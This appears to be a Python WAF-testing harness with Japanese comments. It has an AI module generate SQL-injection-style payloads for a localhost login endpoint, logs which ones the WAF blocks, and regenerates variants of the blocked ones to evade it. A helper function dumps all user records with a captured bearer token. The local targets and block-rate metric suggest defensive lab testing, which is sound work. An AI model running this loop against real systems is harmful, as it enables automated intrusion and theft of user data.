import requests
import json
from Attacker import red_cloud_ai
from Attacker import red_local_ai

# import challengeAPI

#メイン関数
def main():
    
    logs = []  # 初期化

    ai_reply = red_local_ai.payload_ganerate(logs) #ローカルAI使用
    # ai_reply = red_cloud_ai.payload_ganerate(logs) #クラウドAI使用

    logs = payload_p(ai_reply)
    a = input("攻撃結果ログを表示しますか？(y/n):")
    if a in["Y","y","yes"]:
        for i in logs:
            print(f"攻撃ログ：{i}\n")
    while True:
        b = input("攻撃結果から新しい攻撃を生成しますか？(y/n):")
        if b in["Y","y","yes"]:
            #WAFでブロックされた攻撃ログのみを抽出し、新しい攻撃ペイロードを生成
            blocked_logs = [log["ペイロード"] for log in logs if log["WAF"] == "Blocked" or log["ステータスコード"] == 500]
            anather_logs = red_local_ai.payload_ganerate(blocked_logs) #ローカルAI使用
            # anather_logs = red_cloud_ai.payload_ganerate(logs) #クラウドAI使用
            c = input("新しく生成された攻撃で攻撃を実行しますか？(y/n):")
            if c in["Y","y","yes"]:
                logs = payload_p(anather_logs)
                for i in logs:
                    print(f"攻撃ログ：{i}\n")
            else:
                print("処理を終了します")
                break
        else:
            print("処理を終了します")
            break
       
    # user_token,logs = attack_p(*payload) #payloadは複数の戻り値があるので*を使用
    # print("現在のWAF防御率は:",defence_rate(logs))
    # if user_token:
    #     a = input("ユーザー情報を取得しますか？[Y or N]:")
    #     if a in["Y","y","yes"]:
    #         token_p(user_token)
    #     else:
    #         print("処理を終了します")
#攻撃用ペイロード
def payload_p(ai_reply):
    logs = []
    url = "http://localhost:8000/rest/user/login"  # 攻撃対象のURL
    print(f"生成したペイロード:{ai_reply}")
    email_payloads = ai_reply 
    pass_payloads = "aaa"
    for i in email_payloads:
        print(f"\n実行中[email]:{i}---" )
        payload = {
                    "email":i,
                    "password":pass_payloads
                }
        response = requests.post(url,json=payload)
        #攻撃ステータスコードが403だったら記録
        if response.status_code == 403:
            recode = {
                "ペイロード": i,
                "WAF":"Blocked",
                "ステータスコード":403,
                "攻撃結果": False,
            }
            logs.append(recode)
            print(f"インジェクション攻撃がブロックされました:status_code:{response.status_code}")
        elif response.status_code == 200:
            #WAFにブロックされず通過した場合ここで攻撃を記録
            recode = {
                "ペイロード": i,
                "WAF":"Allowed",
                "ステータスコード": response.status_code,
                "攻撃結果":True,
            }
            logs.append(recode) #logs配列に入れる
            print(f"インジェクション攻撃が成功しました:status_code:{response.status_code}")
        elif response.status_code == 500:
            #WAFにブロックされず通過した場合ここで攻撃を記録
            recode = {
                "ペイロード": i,
                "WAF":"Allowed",
                "ステータスコード": response.status_code,
                "攻撃結果":False,
            }
            logs.append(recode) #logs配列に入れる
            print(f"脆弱性の検出に成功:status_code:{response.status_code}")
        else:
            recode = {
                "ペイロード": i,
                "WAF":"Allowed",
                "ステータスコード": response.status_code,
                "攻撃結果":False,
            }
            logs.append(recode) #logs配列に入れる
            print(f"WAFは通過したがインジェクション攻撃は失敗:status_code:{response.status_code}")
    #攻撃ログをlogs.jsonファイルに書き込み
    with open("./Attacker/attack_logs.json","w",encoding="utf-8") as f:
        json.dump(logs,f,ensure_ascii=False,indent=4)

    return logs

#ユーザーデータ取得
def token_p(token):
    myheaders = {"Authorization":f"Bearer {token}"}
    rsa_auth = requests.get("http://localhost:3000/api/Users",headers=myheaders)
    print("ステータスコード:",rsa_auth.status_code)
    print("全ユーザー情報:", rsa_auth.json())
#防御率計算
def defence_rate(logs):
    total = len(logs)
    block = sum(1 for i in logs if i["WAF"] == "Blocked")
    return block/total

if __name__ == "__main__":
    main()
